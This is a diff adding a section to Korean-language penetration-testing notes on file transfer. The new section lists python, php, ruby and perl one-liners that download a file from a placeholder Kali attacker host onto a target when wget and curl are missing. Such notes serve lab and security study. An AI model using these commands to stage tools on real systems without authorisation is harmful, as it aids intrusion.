@@ -111,6 +111,19 @@ tar xf file.tar.gz ; tar xf file.tar.bz2
 
 - 파일 하나면 압축을 유지할 이유가 없다. 보내기 전에 미리 풀어서 알맹이만 전송하면 타겟에서 해제 단계를 생략한다
 
+## 코드 원라이너 다운로드 (wget/curl 없을 때)
+
+```bash
+# python
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<칼리IP>/f","f")'
+python2.7 -c 'import urllib;urllib.urlretrieve("http://<칼리IP>/f","f")'
+
+# php / ruby / perl
+php  -r '$f=file_get_contents("http://<칼리IP>/f");file_put_contents("f",$f);'
+ruby -e 'require "net/http";File.write("f",Net::HTTP.get(URI("http://<칼리IP>/f")))'
+perl -e 'use LWP::Simple;getstore("http://<칼리IP>/f","f");'
+```
+
 ---
 
 ## 쓰기 가능한 경로
